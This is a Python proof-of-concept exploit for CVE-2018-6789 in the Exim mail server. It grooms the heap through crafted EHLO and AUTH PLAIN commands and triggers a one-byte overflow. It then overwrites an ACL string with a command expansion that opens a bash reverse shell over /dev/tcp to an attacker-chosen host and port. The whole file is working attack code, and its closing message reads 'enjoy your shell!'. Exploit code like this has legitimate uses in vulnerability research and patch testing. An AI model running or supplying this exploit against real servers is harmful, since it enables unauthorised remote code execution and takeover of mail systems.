#!/usr/bin/env python3
import time
import socket
import struct
import base64
import argparse

s = None
f = None

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target host', required=True)
    parser.add_argument('-p', '--port', help='Target port', type=int, required=True)
    parser.add_argument('-lh', '--lhost', help='Local host for reverse shell', required=True)
    parser.add_argument('-lp', '--lport', help='Local port for reverse shell', type=int, required=True)
    return parser.parse_args()

def logo():
   print()
   print("CVE-2018-6789 Proof of Concept")
   print("Remake by Nils Putnins (np@seq.lv) based on original by @straight_blast (straightblast426@gmail.com)")
   print()

def connect(host, port):
   global s, f
   s = socket.create_connection((host,port))
   f = s.makefile('rw')

def p(v):
   return struct.pack("<Q", v)

def write(data):
   print(f"Sending: {data}")
   f.write(data + "\n")

def readuntil(delim='\n'):
   data = ''
   while not data.endswith(delim):
      data += f.read(1)
   print(f"Received: {data}")
   return data

def ehlo(v):
   write(f"EHLO {v}")
   resp = readuntil('HELP')
   print(f"Server response: {resp}")

def unrec(v):
   write(v)
   readuntil('command')

def auth_plain(v):
   encode = base64.b64encode(v.encode()).decode().replace('\n','').replace('=','')
   write(f"AUTH PLAIN {encode}")
   readuntil('data')

def one_byte_overwrite():
   v = "C" * 8200
   encode = base64.b64encode(v.encode()).decode().replace('\n','').replace('=','')
   encode = encode[:-1] + "PE"
   write(f"AUTH PLAIN {encode}")
   readuntil('data')

def exploit():
   logo()
   args = parse_args()
   try:
      connect(args.target, args.port)
   except Exception as e:
      print(f"Exception: {e}")
   print("[1] connected to target")
   time.sleep(0.5)

   try:
      ehlo("A" * 8000)
      ehlo("B" * 16)
      print("[2] created free chunk size 0x6060 in unsorted bin")
   except Exception as e:
      print(f"Exception: {e}")

   unrec("\xff" * 2000)
   ehlo("D" * 8200)
   one_byte_overwrite()
   print("[3] triggered 1 byte overwrite to extend target chunk size from 0x2020 to 0x20f0")

   fake_header  = p(0)
   fake_header += p(0x1f51)
   auth_plain("E" * 176 + fake_header + "E" * (8200-176-len(fake_header)))
   print("[4] patched chunk with fake header so extended chunk can be freed")

   ehlo("F" * 16)
   print("[5] freed extended chunk")

   unrec("\xff" * 2000)
   unrec("\xff" * 2000)
   print("[6] occupied 1st and 3rd item in unsorted bin with fillers")

   fake_header  = p(0x4110)
   fake_header += p(0x1f50)
   auth_plain("G" * 176 + fake_header + "G" * (8200-176-len(fake_header)))
   print("[7] patched chunk with fake header so extended chunk can be allocated")

   address = 0x55d7e5864480
   auth_plain("H" * 8200 + p(0x2021) + p(address)  + p(0x2008) + "H" * 184)
   print("[8] overwrite 'next' pointer with ACL store block address")

   ehlo("I" * 16)
   print("[9] freed the ACL store block")

   acl_smtp_rcpt_offset = 288
   local_host = args.lhost
   local_port = args.lport
   cmd = f"/bin/bash -c \"/bin/bash -i >& /dev/tcp/{local_host}/{local_port} 0>&1\""
   cmd_expansion_string = f"${{run{{{cmd}}}}}\0"
   auth_plain("J" * acl_smtp_rcpt_offset + cmd_expansion_string + "J" * (8200 - acl_smtp_rcpt_offset - len(cmd_expansion_string)))
   print("[10] malloced ACL store block and overwrite the content of 'acl_smtp_rcpt' with shell expression")

   write("MAIL FROM:<test@pwned.com>")
   readuntil("OK")
   write("RCPT TO:<shell@pwned.com>")
   print("[11] triggered RCPT TO and executing shell expression ... enjoy your shell!")
   print()

def main():
   exploit()

if __name__ == '__main__':
   main()
